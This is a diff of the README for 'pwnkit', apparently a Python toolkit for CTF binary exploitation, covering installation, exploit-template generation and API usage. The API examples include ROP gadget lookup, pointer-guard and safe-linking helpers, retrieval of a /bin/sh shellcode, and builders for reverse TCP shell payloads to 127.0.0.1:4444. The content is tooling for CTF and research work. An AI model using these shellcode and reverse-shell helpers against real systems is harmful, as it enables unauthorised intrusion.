@@ -1,29 +1,33 @@
 # pwnkit
 
-**[!] Under construction.Developing and fixing bugs**
+**[!] Under construction.
 
 [![PyPI version](https://img.shields.io/pypi/v/pwnkit.svg)](https://pypi.org/project/pwnkit/)
-
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Python Versions](https://img.shields.io/pypi/pyversions/pwnkit.svg)](https://pypi.org/project/pwnkit/)
+
+Exploitation toolkit for pwn CTFs & Linux binary exploitation research.  
+Includes exploit templates, I/O helpers, ROP gadget mappers, pointer mangling utilities, curated shellcodes, exploit gadgets, House of Maleficarum, gdb/helper scripts, etc.
+
 ---
 
 ## Installation
 
 From [PyPI](https://pypi.org/project/pwnkit/):
 
-*Method 1*. Install into **current Python environment** (could be system-wide, venv, conda env, etc.). use it both as CLI and Python API:
+**Method 1**. Install into **current Python environment** (could be system-wide, venv, conda env, etc.). use it both as CLI and Python API:
 
 ```bash
 pip install pwnkit
 ```
 
-*Method 2*. Install using `pipx` as standalone **CLI tools**:
+**Method 2**. Install using `pipx` as standalone **CLI tools**:
 
 ```bash
 pipx install pwnkit
 ```
 
-*Method 3.* Install from source (dev):
+**Method 3.** Install from source (dev):
 
 ```bash
 git clone https://github.com/4xura/pwnkit.git
@@ -37,8 +41,9 @@ pip install -e .
 
 ### CLI
 
+All options:
 ```bash
-pwnkit --help
+pwnkit -h
 ```
 Create an exploit script template:
 ```bash
@@ -50,13 +55,16 @@ pwnkit xpl.py --file ./pwn --host 10.10.10.10 --port 31337
 
 # Override default preset with individual flags
 pwnkit xpl.py -f ./pwn -i 10.10.10.10 -p 31337 -A aarch64 -E big
+
+# Minimal setup to fill up by yourself
+pwnkit xpl.py
 ```
-Example:
+Example using default template:
 ```bash
 $ pwnkit exp.py -f ./evil-corp -l ./libc.so.6 \
                 -A aarch64 -E big \
                 -a john.doe -b https://johndoe.com
-[+] Wrote exp.py
+[+] Wrote exp.py (template: pkg:default.py.tpl)
 
 $ cat exp.py
 #!/usr/bin/env python3
@@ -90,7 +98,7 @@ ctx = Context(
     os        = 'linux',
     endian    = 'big',
     log_level = 'debug',
-    terminal  = ('tmux', 'splitw', '-h')
+    terminal  = ('tmux', 'splitw', '-h')	# remove when no tmux sess
 ).push()
 
 io = Tube(
@@ -100,7 +108,7 @@ io = Tube(
     port      = port,
     env       = {}
 ).init().alias()
-set_global_io(io._t())  # s, sa, sl, sla, r, ru, uu64
+set_global_io(io)  # s, sa, sl, sla, r, ru, uu64
 
 init_pr("debug", "%(asctime)s - %(levelname)s - %(message)s", "%H:%M:%S")
 
@@ -112,6 +120,33 @@ def xpl():
 
 if __name__ == "__main__":
     xpl()
+```
+List available built-in templates:
+```bash
+$ pwnkit -lt
+[*] Bundled templates:
+   - default
+   - got
+   - heap
+   - minimal
+   - ret2libc
+   - ret2syscall
+   - setcontext
+   - srop
+   ...
+```
+Use a built-in template:
+```bash
+pwnkit exp.py -t heap
+```
+Use your own custom template (`*.tpl` or `*.py.tpl`):
+```bash
+pwnkit exp.py -t ./mytpl.py.tpl
+```
+Or put it in a directory and point `PWNKIT_TEMPLATES` to it:
+```bash
+export PWNKIT_TEMPLATES=~/templates
+pwnkit exploit.py -t mytpl
 ```
 
 ### Python API
@@ -128,21 +163,67 @@ ctx = Context(
     os		  = "linux"
     endian	  = "little"
     log_level = "debug"
-    terminal  = ("tmux", "splitw", "-h")
+    terminal  = ("tmux", "splitw", "-h")	# remove when no tmux
 )
 """
 ctx.push()   # applies to pwntools' global context
 
-# simple I/O stream
+# - Simple I/O stream
 io = Tube(
     file_path = "/usr/bin/sudoedit",
     libc_path = "./libc.so.6",
     host      = "127.0.0.1",
     port	  = 123456,
     env		  = {}
-).alias()
+).init().alias()
 io.sl(b"hello")
-print(io.r(5))   # b'hello'
+print(io.r(5))  # b'hello'
+
+# - Use io aliases globally
+set_global_io(io)
+sl(b"hello")
+print(r(5))     # b'hello'
+
+# - ROP after leaking libc_base
+libc.address = libc_base
+ggs 	= ROPGadgets(libc)
+p_rdi_r = ggs['p_rdi_r']
+p_rsi_r = ggs['p_rsi_r']
+p_rax_r = ggs['p_rax_r']
+p_rsp_r = ggs['p_rsp_r']
+p_rdx_rbx_r = ggs['p_rdx_rbx_r']
+leave_r = ggs['leave_r']
+ret 	= ggs['ret']
+...
+
+# - libc Pointer protection
+# 1) Pointer guard
+guard = 0xdeadbeef	# leak it or overwrite it
+pg = PointerGuard(guard)
+ptr = 0xcafebabe
+enc_ptr = pg.mangle(ptr)
+dec_ptr = pg.demangle(enc_ptr)
+assert ptr == dec_ptr
+
+# 2) Safe linking 
+#    e.g., after leaking heap_base for tcache
+slfd = SafeLinking(heap_base)
+fd = 0x55deadbeef
+enc_fd = slfd.encrypt(fd)
+dec_fd = slfd.decrypt(enc_fd)
+assert fd == dec_fd
+
+# - Shellcode generation
+# 1) Retrieve from ShellcodeStore
+sc_binsh = SHELLCODESTORE.get("amd64", "execve_bin_sh").blob
+# 2) Build an ascii-only decoder stub for amd64 using RAX seed
+builder = ShellcodeBuilder("amd64")
+stub = builder.build_alpha_shellcode("rax")
+# 3) Build reverse TCP connect/shell blobs
+sc_revconn = builder.build_reverse_tcp_connect("127.0.0.1", 4444)
+sc_revsh   = builder.build_reverse_tcp_shell("127.0.0.1", 4444)
+
+...
 
 io.interactive() 
 ```
